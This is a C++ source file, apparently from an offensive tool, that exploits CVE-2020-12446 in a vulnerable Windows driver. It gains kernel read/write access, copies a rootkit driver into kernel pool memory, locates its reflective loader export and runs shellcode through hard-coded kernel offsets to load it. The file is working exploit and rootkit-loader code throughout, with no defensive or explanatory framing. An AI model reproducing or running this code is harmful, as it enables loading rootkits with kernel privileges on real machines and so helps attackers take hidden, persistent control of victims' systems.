/*
	Exploits CVE-2020-12446 to gain virtual r/w primitives and load a driver.
*/

#include <memory>
#include <fstream>
#include <iostream>

#include "DriverLoaderShellcode2.h"
#include "RunShellcode.h"
#include "Utils.h"

// link for PE helpers
#pragma comment(lib, "dbghelp.lib")

constexpr ULONG PsCreateSystemThreadOffset = 0x6534F0;
constexpr ULONG MmGetSystemRoutineOffset = 0x6450E0;

/*
	Arguments:
		1: path to the vulnerable driver's device object symlink
		2: path to rootkit driver on disk
*/
int main(char* argv[], int argc) {
	auto* vulnDriver = argv[1];
	auto* rootkitDriver = argv[2];

	try {
		OutputDebugStringA("I am running\n");
		std::cout << "running" << std::endl;
		auto rw = std::make_unique<KernelReadWrite>(std::string(vulnDriver));
		std::cout << "Initialized rw primitives\n";

		ShellcodeRunner runner(*rw.get());
		std::cout << "Initialized shellcode runner\n";

		/*
			step 1: copy image to kernel memory
		*/
		DWORD driverSize = 0;
		{
			Utils::AutoHandle fileHandle(CreateFileA(
				rootkitDriver, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
				nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr));
			driverSize = GetFileSize(fileHandle.get(), nullptr);
		}
		auto* driverBase = reinterpret_cast<PVOID>(LoadLibraryA(rootkitDriver));
		std::cout << "Driver base address " << std::hex << driverBase;
		if (driverBase == nullptr) return 1;

		auto* kernelImage = (PBYTE)runner.CopyToPool(driverBase, driverSize);
		if (kernelImage == nullptr) {
			return 1;
		}

		/*
			step 2: get offset of loader
		*/

		auto* loaderAddress = (PBYTE)PeUtils::GetExportAddress((PBYTE)driverBase, "?RelectiveLoader@Loader@@YAXPEAULoaderContext@1@@Z");
		if (loaderAddress == nullptr) {
			return 1;
		}
		auto kernelLoaderOffset = loaderAddress - (PBYTE)driverBase;

		/*
			step 3: call shellcode to launch a new thread that loads the driver
		*/
		if ((ULONG32)kernelLoaderOffset != kernelLoaderOffset) {
			throw std::runtime_error("offset of loader too large, modify linker");
		}
		auto kernelBase = std::get<1>(PeUtils::GetKernelModuleAddresses());
		runner.RunShellcode((PVOID)LoadDriverShellcode, GetLoaderShellcodeSize(),
			kernelBase + MmGetSystemRoutineOffset, (ULONG64)kernelImage, kernelLoaderOffset);
	}
	catch (std::exception& exception) {
		std::cout << "Got exception " << exception.what() << std::endl;
	}
	
}